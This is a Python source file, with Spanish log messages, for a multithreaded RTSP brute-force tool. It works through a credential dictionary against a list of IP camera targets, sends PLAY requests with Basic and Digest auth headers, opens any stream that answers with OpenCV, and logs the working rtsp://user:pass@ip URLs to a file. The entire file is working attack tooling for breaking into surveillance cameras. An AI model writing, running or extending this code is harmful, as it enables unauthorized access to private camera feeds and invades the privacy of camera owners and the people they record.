import logging
import socket
import base64
import concurrent.futures
import argparse
import time
import cv2
import os
import queue
from tqdm import tqdm

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class RTSPBruteModule:
    
    def __init__(self):
        self.targets = []
        self.credentials = []
        self.pause_duration = 1
        self.max_threads = 50
        self.timeout = 5
        self.total_combinations = 0
        self.completed_combinations = 0
        self.seen_ips = set()

    def setup(self, targets, dictionary_file, pause_duration=1, max_threads=50, timeout=5):
        self.targets = targets
        self.credentials = self.load_credentials(dictionary_file)
        self.pause_duration = pause_duration
        self.max_threads = max_threads
        self.timeout = timeout
        self.total_combinations = len(targets) * len(self.credentials)

    def load_credentials(self, dictionary_file):
        try:
            with open(dictionary_file, 'r') as f:
                return [line.strip() for line in f.readlines()]
        except FileNotFoundError:
            logging.error(f"Archivo de diccionario {dictionary_file} not found.")
            return []

    def run(self):
        total_targets = len(self.targets)
        logging.info(f"[*] Objetivos totales: {total_targets}")

        queue_instance = self.generate_queue()
        tasks = []

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            with tqdm(total=self.total_combinations, desc="Progress", position=0, leave=True) as pbar:       
                while not queue_instance.empty():
                    task = queue_instance.get()
                    future = executor.submit(self.brute_force, task)
                    future.add_done_callback(lambda _: pbar.update())
                    tasks.append(future)
                
                # Esperar a que todas las tareas se completen
                concurrent.futures.wait(tasks)

        logging.info("[*] Finished all threads")

    def generate_queue(self):
        queue_instance = queue.Queue()

        # Cargar las IPs ya vistas desde el archivo
        if os.path.exists("RTSPCONECT.txt"):
            with open("RTSPCONECT.txt", "r") as file:
                lines = file.readlines()
                for line in lines:
                    ip = line.split('@')[1].split(':')[0]
                    self.seen_ips.add(ip)

        for target in self.targets:
            ip, port = target
            if ip not in self.seen_ips:
                # Verificar si la IP ya está en el archivo RTSPCONECT.txt
                if os.path.exists("RTSPCONECT.txt"):
                    with open("RTSPCONECT.txt", "r") as file:
                        if any(ip in line for line in file):
                            self.seen_ips.add(ip)
                        else:
                            for credential in self.credentials:
                                queue_instance.put((target, credential))
                else:
                    for credential in self.credentials:
                        queue_instance.put((target, credential))

        return queue_instance

    def rtsp_request(self, target, credential):
        ip, port = target
        passwToBytes = credential.encode('ascii')
        passwToB64 = base64.b64encode(passwToBytes)
        passwF = passwToB64.decode('ascii')
        user, passwd = credential.split(':')

        auth_methods = [
            f"Authorization: Basic {passwF}\r\n",
            f"Proxy-Authorization: Basic {passwF}\r\n",
            f"Authorization: Digest username=\"{user}\", realm=\"\", nonce=\"\", uri=\"rtsp://{ip}:{port}/\", response=\"\"\r\n",
            f"Proxy-Authorization: Digest username=\"{user}\", realm=\"\", nonce=\"\", uri=\"rtsp://{ip}:{port}/\", response=\"\"\r\n",
        ]

        retries = 1

        for _ in range(retries):
            for auth in auth_methods:
                req = (
                    f"PLAY rtsp://{ip}:{port}/ RTSP/1.0\r\n"
                    f"CSeq: 2\r\n"
                    f"{auth}\r\n"
                )

                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(self.timeout)
                    s.connect((ip, int(port)))
                    encodereq = req.encode('ascii')
                    s.sendall(encodereq)
                    data = s.recv(1024)
                    response = data.decode('ascii')
                    s.close()
                    url = f"rtsp://{credential}@{ip}:{port}/"
                    return self.display_camera(url)
                except socket.timeout:
                    continue
                    #logging.info(f"Timeout occurred. Retrying... (Attempts left: {retries - 1})")
                except socket.error as e:
                    continue

            retries -= 1
        return False

    def display_camera(self, url):
        ip = url.split('@')[1].split(':')[0]
        logging.info(f"Intentando conectarse a {url}")

        cap = cv2.VideoCapture(url, cv2.CAP_FFMPEG)
        if cap.isOpened():
            logging.info(f"Visualización de la transmisión de la cámara desde {url}")
            start_time = time.time()
            while time.time() - start_time < 10:
                ret, frame = cap.read()
                if not ret:
                    break
                if cv2.waitKey(1) & 0xFF == ord('q'):
                    break
            cap.release()
            cv2.destroyAllWindows()
            self.save_url(url)
            return True
        else:
            logging.error(f"No se pudo abrir la transmisión de video desde {url}")
            return False

    def save_url(self, url):
        ip = url.split('@')[1].split(':')[0]
        logging.info(f"Guardando URL: {url}")
        if not os.path.exists("RTSPCONECT.txt"):
            open("RTSPCONECT.txt", 'w').close()

        with open("RTSPCONECT.txt", "r") as file:
            lines = file.readlines()

        # Eliminar duplicados y verificar si la IP ya está en la lista
        new_lines = []
        seen_ips = set()
        for line in lines:
            saved_ip = line.split('@')[1].split(':')[0]
            if saved_ip not in seen_ips:
                seen_ips.add(saved_ip)
                new_lines.append(line)
        
        # Agregar nuevo URL si la IP no existe
        if ip not in seen_ips:
            new_lines.append(url + '\n')
            self.seen_ips.add(ip)
        
        with open("RTSPCONECT.txt", "w") as file:
            file.writelines(new_lines)

    def brute_force(self, task):
        target, credential = task
        ip, port = target
        if not self.rtsp_request(target, credential):
            logging.info(f"Inicio de sesión fallido para {ip}:{port} con {credential}")
        time.sleep(self.pause_duration)
